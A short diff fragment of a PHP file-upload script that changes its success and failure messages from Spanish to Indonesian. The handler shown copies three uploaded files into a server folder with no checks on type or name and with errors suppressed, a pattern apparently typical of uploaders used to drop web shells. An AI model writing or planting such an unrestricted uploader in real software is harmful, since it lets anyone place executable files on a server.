@@ -35,11 +35,11 @@ echo '<input type="file" name="file1" size="50">
 
 { if(@copy($_FILES['file1']['tmp_name'], "skbp_file/file1".$_FILES['file1']['name']) && @copy($_FILES['file2']['tmp_name'], "skbp_file/file2".$_FILES['file2']['name']) && @copy($_FILES['file3']['tmp_name'], "skbp_file/file3".$_FILES['file3']['name']))
 {
-echo '<b>Archivo subido!</b><br><br>';
+echo '<b>sukses</b><br><br>';
 }
 else
 {
-echo '<b>Upludo Falio!</b><br><br></font>';
+echo '<b>Gagal</b><br><br></font>';
 }
 }
 
